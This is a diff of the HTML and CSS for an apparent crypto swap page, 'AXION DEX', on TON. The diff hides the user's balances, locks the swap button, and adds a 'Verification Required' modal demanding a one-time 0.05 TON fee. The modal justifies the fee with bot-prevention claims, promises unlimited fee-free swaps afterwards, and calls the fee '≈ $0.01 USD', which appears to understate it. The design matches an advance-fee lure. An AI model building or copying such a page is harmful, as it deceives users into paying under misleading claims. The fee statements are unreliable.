@@ -42,12 +42,7 @@
             z-index: -1;
         }
 
-        /* Smooth Scrolling */
-        html {
-            scroll-behavior: smooth;
-        }
-
-        /* Glass Card - Premium Version */
+        /* Glass Card */
         .glass-card {
             background: rgba(18, 25, 22, 0.75);
             backdrop-filter: blur(20px);
@@ -57,17 +52,12 @@
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .glass-card:hover {
-            border-color: rgba(46, 204, 113, 0.4);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(46, 204, 113, 0.1) inset;
-        }
-
         .container {
             max-width: 500px;
             margin: 0 auto;
         }
 
-        /* Premium Header */
+        /* Header */
         .header {
             text-align: center;
             padding: 8px 0 24px;
@@ -91,10 +81,9 @@
             color: #6c8b7a;
             font-size: 13px;
             margin-top: 8px;
-            letter-spacing: 0.5px;
         }
 
-        /* Wallet Section - Premium */
+        /* Wallet Section */
         .wallet-section {
             padding: 20px 24px;
             margin-bottom: 24px;
@@ -135,73 +124,11 @@
             min-width: 150px;
         }
 
-        /* Balance Cards - Premium DEX Style */
-        .balance-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 16px;
-            margin-bottom: 24px;
-        }
-        .balance-card {
-            padding: 20px 16px;
-            text-align: center;
-            border-radius: 32px;
-            position: relative;
-            overflow: hidden;
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        .balance-card:active {
-            transform: scale(0.98);
-        }
-        .balance-card::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(46, 204, 113, 0.15), transparent);
-            transition: left 0.5s;
-        }
-        .balance-card:hover::after {
-            left: 100%;
-        }
-        .balance-card .icon {
-            font-size: 38px;
-            margin-bottom: 12px;
-        }
-        .balance-card .label {
-            font-size: 12px;
-            color: #8bc34a;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 600;
-        }
-        .balance-card .value {
-            font-size: 28px;
-            font-weight: 800;
-            margin-top: 8px;
-        }
-        .balance-card.axc .value { 
-            color: #f1c40f; 
-            text-shadow: 0 0 20px rgba(241, 196, 15, 0.2);
-        }
-        .balance-card.usdt .value { 
-            color: #2ecc71; 
-            text-shadow: 0 0 20px rgba(46, 204, 113, 0.2);
-        }
-
-        /* Swap Box - Premium DEX Style */
+        /* Swap Box */
         .swap-box {
             padding: 24px;
             margin-bottom: 24px;
             border-radius: 40px;
-            transition: all 0.3s;
-        }
-        .swap-box.disabled {
-            opacity: 0.7;
-            filter: blur(3px);
-            pointer-events: none;
         }
         .swap-input-group {
             background: rgba(0, 0, 0, 0.45);
@@ -214,7 +141,6 @@
         .swap-input-group:focus-within {
             border-color: #2ecc71;
             box-shadow: 0 0 20px rgba(46, 204, 113, 0.15);
-            background: rgba(0, 0, 0, 0.55);
         }
         .swap-label {
             display: flex;
@@ -239,7 +165,6 @@
             font-weight: 700;
             outline: none;
             font-family: monospace;
-            letter-spacing: 0.5px;
         }
         .swap-input-row input[type="number"] {
             -moz-appearance: textfield;
@@ -251,7 +176,6 @@
         }
         .swap-input-row input::placeholder {
             color: #3a5a4a;
-            font-weight: 500;
         }
         .token-badge {
             background: rgba(46, 204, 113, 0.15);
@@ -263,10 +187,6 @@
             align-items: center;
             gap: 10px;
             border: 1px solid rgba(46, 204, 113, 0.3);
-            backdrop-filter: blur(4px);
-        }
-        .token-badge i {
-            font-size: 18px;
         }
         .swap-arrow {
             text-align: center;
@@ -291,73 +211,40 @@
             color: #f1c40f;
             font-size: 13px;
             margin: 20px 0 16px;
-            font-weight: 500;
-        }
-        .swap-rate i {
-            margin: 0 6px;
         }
 
-        /* Premium SWAP Button - Lock/Unlock */
+        /* Premium SWAP Button */
         .btn-swap {
             width: 100%;
-            background: linear-gradient(145deg, #f1c40f, #d4ac0d);
             border: none;
             border-radius: 60px;
             padding: 18px;
             font-weight: 800;
             font-size: 16px;
-            color: #1a2a1a;
             cursor: pointer;
             transition: all 0.25s;
-            position: relative;
-            overflow: hidden;
-            letter-spacing: 1px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
-        .btn-swap::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            transition: left 0.4s;
-        }
-        .btn-swap:hover::before {
-            left: 100%;
-        }
-        .btn-swap:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            background: linear-gradient(145deg, #4a5a4a, #3a4a3a);
-            color: #8a9a8a;
-            transform: none;
-        }
-        .btn-swap:disabled:hover::before {
-            left: -100%;
-        }
-        .btn-swap:active:not(:disabled) {
-            transform: scale(0.97);
-        }
-
-        /* Locked State Styling */
-        .btn-swap.locked {
-            background: linear-gradient(145deg, #4a5a4a, #3a4a3a);
-            color: #8a9a8a;
-        }
-        .btn-swap.locked i {
-            color: #e74c3c;
-        }
-        .btn-swap.unlocked {
+        .btn-swap.active {
             background: linear-gradient(145deg, #f1c40f, #d4ac0d);
             color: #1a2a1a;
         }
-        .btn-swap.unlocked i {
+        .btn-swap.active i {
             color: #2ecc71;
+        }
+        .btn-swap.locked {
+            background: linear-gradient(145deg, #2c3e50, #1a2a3a);
+            color: #8a9a8a;
+            border: 1px solid rgba(241, 196, 15, 0.3);
+        }
+        .btn-swap.locked i {
+            color: #f1c40f;
+        }
+        .btn-swap:active {
+            transform: scale(0.97);
         }
 
         /* Status Messages */
@@ -370,17 +257,10 @@
             margin: 16px 0 0;
             display: none;
             animation: slideIn 0.3s ease;
-            font-weight: 500;
         }
         @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .status-msg.success {
             background: rgba(46, 204, 113, 0.15);
@@ -425,12 +305,10 @@
             font-size: 14px;
             margin-bottom: 14px;
             outline: none;
-            transition: all 0.2s;
         }
         .withdraw-input:focus {
             border-color: #2ecc71;
             box-shadow: 0 0 15px rgba(46, 204, 113, 0.1);
-            background: rgba(0, 0, 0, 0.55);
         }
         .btn-withdraw {
             width: 100%;
@@ -452,7 +330,119 @@
             transform: translateY(-2px);
             box-shadow: 0 10px 25px rgba(230, 126, 34, 0.25);
         }
-        .btn-withdraw:active {
+
+        /* Modal Popup */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal {
+            background: linear-gradient(145deg, #1a2a22, #0f1a15);
+            border-radius: 48px;
+            padding: 28px 24px;
+            max-width: 340px;
+            width: 85%;
+            text-align: center;
+            border: 1px solid rgba(46, 204, 113, 0.3);
+            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.5);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        .modal-overlay.active .modal {
+            transform: scale(1);
+        }
+        .modal-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .modal h2 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            color: #f1c40f;
+        }
+        .modal .fee-amount {
+            font-size: 28px;
+            font-weight: 800;
+            color: #2ecc71;
+            margin: 16px 0 8px;
+        }
+        .modal .fee-usd {
+            color: #8bc34a;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+        .modal .reason-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 24px;
+            padding: 16px;
+            text-align: left;
+            margin: 16px 0;
+        }
+        .modal .reason-box p {
+            color: #bdc3c7;
+            font-size: 13px;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .modal .reason-box i {
+            width: 24px;
+            color: #2ecc71;
+        }
+        .modal .note {
+            font-size: 12px;
+            color: #f1c40f;
+            margin: 16px 0;
+            padding: 8px;
+            background: rgba(241, 196, 15, 0.1);
+            border-radius: 16px;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .modal-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: none;
+        }
+        .modal-btn-primary {
+            background: linear-gradient(145deg, #2ecc71, #1e8a3e);
+            color: white;
+        }
+        .modal-btn-secondary {
+            background: rgba(231, 76, 60, 0.2);
+            color: #e74c3c;
+            border: 1px solid rgba(231, 76, 60, 0.3);
+        }
+        .modal-btn-primary:active {
+            transform: scale(0.97);
+        }
+        .modal-btn-secondary:active {
             transform: scale(0.97);
         }
 
@@ -473,7 +463,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Confetti Canvas */
         #confetti-canvas {
             position: fixed;
             top: 0;
@@ -486,10 +475,8 @@
 
         @media (max-width: 450px) {
             body { padding: 12px; }
-            .balance-card .value { font-size: 24px; }
             .swap-input-row input { font-size: 26px; }
             .token-badge { padding: 8px 16px; font-size: 13px; }
-            .swap-input-group { padding: 14px 16px; }
         }
     </style>
 </head>
@@ -501,7 +488,7 @@
         <!-- Header -->
         <div class="header">
             <h1>⚡ AXION DEX</h1>
-            <p>Swap AXC ↔ USDT • Instant • Low Fee</p>
+            <p>Swap AXC ↔ USDT • Instant • Secure</p>
         </div>
 
         <!-- Wallet Connection -->
@@ -516,22 +503,8 @@
             <div id="ton-connect"></div>
         </div>
 
-        <!-- Balances -->
-        <div class="balance-row">
-            <div class="glass-card balance-card axc">
-                <div class="icon"><i class="fas fa-gem"></i></div>
-                <div class="label">AXC Balance</div>
-                <div class="value" id="axcBalance">0</div>
-            </div>
-            <div class="glass-card balance-card usdt">
-                <div class="icon"><i class="fas fa-dollar-sign"></i></div>
-                <div class="label">USDT Balance</div>
-                <div class="value" id="usdtBalance">$0.00</div>
-            </div>
-        </div>
-
         <!-- Swap Interface -->
-        <div class="glass-card swap-box" id="swapBox">
+        <div class="glass-card swap-box">
             <div class="swap-input-group">
                 <div class="swap-label">
                     <span><i class="fas fa-arrow-up"></i> You Pay</span>
@@ -565,8 +538,8 @@
                 <i class="fas fa-coins" style="margin-left: 12px;"></i> Fee: 0.05 TON (one‑time)
             </div>
 
-            <button class="btn-swap locked" id="swapBtn" disabled>
-                <i class="fas fa-lock"></i> CONFIRM SWAP
+            <button class="btn-swap locked" id="swapBtn">
+                <i class="fas fa-lock"></i> 🔒 SWAP LOCKED
             </button>
 
             <div id="swapStatus" class="status-msg"></div>
@@ -583,6 +556,32 @@
             <div id="withdrawStatus" class="status-msg"></div>
         </div>
 
+    </div>
+
+    <!-- Modal Popup for Verification Fee Explanation -->
+    <div class="modal-overlay" id="verificationModal">
+        <div class="modal">
+            <div class="modal-icon"><i class="fas fa-shield-alt"></i></div>
+            <h2>🔒 Verification Required</h2>
+            <div class="fee-amount">0.05 TON</div>
+            <div class="fee-usd">≈ $0.01 USD</div>
+            
+            <div class="reason-box">
+                <p><i class="fas fa-robot"></i> Prevent bot farms & fake accounts</p>
+                <p><i class="fas fa-user-check"></i> Verify real human users only</p>
+                <p><i class="fas fa-network-wired"></i> Covers TON network transaction fee</p>
+                <p><i class="fas fa-infinity"></i> Paid once — unlocked forever</p>
+            </div>
+            
+            <div class="note">
+                <i class="fas fa-info-circle"></i> This is a one-time verification fee. After payment, you can swap unlimited times with zero additional fees.
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn modal-btn-secondary" id="modalCancelBtn">Cancel</button>
+                <button class="modal-btn modal-btn-primary" id="modalProceedBtn">Proceed</button>
+            </div>
+        </div>
     </div>
 
     <script src="app.js"></script>
